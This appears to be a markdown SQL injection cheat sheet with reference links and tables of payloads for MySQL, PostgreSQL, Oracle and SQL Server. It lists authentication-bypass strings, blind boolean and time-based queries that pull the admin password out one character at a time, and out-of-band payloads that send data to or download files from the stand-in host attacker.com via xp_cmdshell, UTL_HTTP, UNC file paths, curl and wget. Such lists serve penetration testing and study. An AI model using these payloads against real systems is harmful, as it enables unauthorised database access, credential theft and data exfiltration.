### SQL Injection

References:
```
https://portswigger.net/web-security/sql-injection
https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
https://owasp.org/www-community/attacks/SQL_Injection
```

Tables for Reference:

#### In-Band SQLi

| Operation                     | MySQL Command                                                                 | PostgreSQL Command                                                             | Oracle Command                                                                 |
|------------------------------|-------------------------------------------------------------------------------|--------------------------------------------------------------------------------|--------------------------------------------------------------------------------|
| Check Database Version       | `SELECT @@version;`                                                           | `SELECT version();`                                                            | `SELECT * FROM v$version;`                                                    |
| List All Tables in Schema    | `SELECT table_name FROM information_schema.tables WHERE table_schema=Database();` | `SELECT table_name FROM information_schema.tables WHERE table_schema=Database();` | `SELECT table_name FROM all_tables WHERE owner='SCHEMA_NAME';`               |
| List All Columns in Schema   | `SELECT column_name FROM information_schema.columns WHERE table_schema='schema_name';` | `SELECT column_name FROM information_schema.columns WHERE table_schema='schema_name';` | `SELECT column_name FROM all_tab_columns WHERE owner='SCHEMA_NAME';`         |
| Concat Two Strings           | `CONCAT(string1, string2)`                                                    | `CONCAT(string1, string2)`                                                     | `string1 || string2`                                                          |

#### Blind SQLi

| Blind SQL Injection Code/Payload                                             | Purpose                                    | Type            | Description                                                                                  |
|------------------------------------------------------------------------------|--------------------------------------------|------------------|----------------------------------------------------------------------------------------------|
| `' OR 1=1 --`                                                                | Always true condition to bypass authentication | Boolean         | Forces the query to always evaluate as true, granting access or revealing information.       |
| `' AND 1=2 --`                                                               | Always false condition to test behavior     | Boolean         | Tests how the application behaves when the query evaluates as false.                         |
| `' AND (SELECT LENGTH(database())) = 5 --`                                   | Check the length of the database name       | Boolean         | Infers the length of the database name based on the application's response.                  |
| `' AND ASCII(SUBSTRING((SELECT user()), 1, 1)) > 77 --`                      | Extract a single character from the username | Boolean         | Uses ASCII values and conditional checks to infer individual characters of sensitive data.   |
| `' AND SLEEP(5) --`                                                          | Delay execution to detect vulnerabilities   | Time-Based      | Causes the query to pause for 5 seconds, confirming vulnerability if delay is observed.      |
| `' OR IF(1=1, SLEEP(5), 0) --`                                               | Conditional delay based on true/false       | Time-Based      | Executes delay if condition is true, useful for extracting information bit by bit.           |
| `' AND BENCHMARK(1000000, MD5('test')) --`                                   | Force server to perform computation         | Time-Based      | Measures response time to detect injection points via computational delays.                  |
| `' AND (SELECT COUNT(*) FROM information_schema.tables) > 10 --`            | Check table count in the schema             | Boolean         | Infers number of tables by observing application behavior.                                   |
| `' AND (SELECT table_name FROM information_schema.tables LIMIT 1) = 'users' --` | Check if a specific table exists         | Boolean         | Tests for presence of a specific table in the database.                                      |
| `' AND EXISTS(SELECT * FROM users WHERE username='admin') --`               | Check if a specific record exists           | Boolean         | Infers existence of a user or record.                                                        |
| `' AND 1=IF((SELECT LENGTH(password) FROM users WHERE username='admin') > 8, SLEEP(5), 0) --` | Extract password length         | Time-Based      | Delays execution if condition is true, revealing info bit by bit.                            |
| `' AND (SELECT CASE WHEN (user() LIKE 'root%') THEN SLEEP(5) ELSE 0 END) --` | Check if current user is root               | Time-Based      | Uses conditional delays to confirm user roles/privileges.                                    |
| `' AND (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username='admin') > 77 --` | Extract password character | Boolean         | Extracts character-by-character password data using ASCII checks.                            |
| `' AND (SELECT DATABASE()) = 'test_db' --`                                   | Check current database                      | Boolean         | Confirms current database name.                                                              |
| `' AND (SELECT @@version) LIKE '8.%' --`                                     | Check DB version                            | Boolean         | Infers DB version via conditional string check.                                              |
| `' AND (SELECT COUNT(*) FROM users) > 5 --`                                  | Check number of users                       | Boolean         | Reveals record count in a table.                                                             |
| `' UNION SELECT NULL, NULL, NULL --`                                         | Test for number of columns in query         | Boolean         | Helps determine the correct column count for UNION attacks.                                  |
| `' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 10 THEN 1 ELSE SLEEP(5) END) --` | Conditional delay based on count | Time-Based      | Delays execution if record count exceeds threshold.                                          |


#### Out-of-Band SQLi

| Out-of-Band Code/Payload                                | Purpose                                      | Applicable Databases        | Description                                                                                 |
|----------------------------------------------------------|----------------------------------------------|------------------------------|---------------------------------------------------------------------------------------------|
| `LOAD_FILE('\\\\attacker.com\\payload.txt')`             | Trigger DNS request to exfiltrate data       | MySQL                        | Attempts to load a file from a remote server, initiating a DNS query.                       |
| `INTO OUTFILE '\\\\attacker.com\\data.txt'`              | Write data to a remote server                | MySQL                        | Writes query results to a file on an external server.                                       |
| `xp_cmdshell('nslookup attacker.com')`                   | Execute a system command for DNS lookup      | Microsoft SQL Server         | Runs a system command to resolve a malicious hostname.                                      |
| `UTL_HTTP.REQUEST('http://attacker.com')`                | Send HTTP request to attacker server         | Oracle                       | Uses Oracle UTL_HTTP to send a request to the attacker's domain.                            |
| `DBMS_LDAP.INIT('attacker.com', 389)`                    | Trigger LDAP query to a remote server        | Oracle                       | Uses LDAP connection to contact a remote server.                                             |
| `OPENROWSET('SQLNCLI', 'Server=attacker.com', ...)`      | Connect to external SQL server               | Microsoft SQL Server         | Opens a connection to a remote SQL server.                                                  |
| `curl http://attacker.com?data=$(query)`                | Exfiltrate data via HTTP                     | Any (via OS commands)        | Sends query output to attacker-controlled server using `curl`.                              |
| `wget http://attacker.com/file`                          | Download malicious payloads                  | Any (via OS commands)        | Downloads malicious files from the attacker's domain.                                       |
| `SELECT ... INTO DUMPFILE '\\\\attacker.com\\dump'`      | Write sensitive data to a remote location    | MySQL                        | Exports data directly to an external path.                                                  |
| `dns_lookup('attacker.com')`                             | Trigger DNS query                            | PostgreSQL (via extensions)  | Uses extensions to perform DNS resolution to exfiltrate data.                              |
| `SELECT pg_read_file('\\\\attacker.com\\file')`          | Read remote files                            | PostgreSQL                   | Attempts to read from a remote source using PostgreSQL functions.                           |
| `wget http://attacker.com/$(query_output)`               | Combine query result in HTTP request         | Any (via OS commands)        | Sends query output as part of a web request.                                                |
| `SELECT master.dbo.xp_dirtree '\\\\attacker.com\\'`      | Trigger directory listing remotely           | Microsoft SQL Server         | Uses `xp_dirtree` to list directories and initiate outbound connection.                     |
| `EXEC xp_cmdshell('ping attacker.com')`                  | Ping attacker's server to confirm execution  | Microsoft SQL Server         | Uses ICMP to verify if a command has been successfully executed.                            |

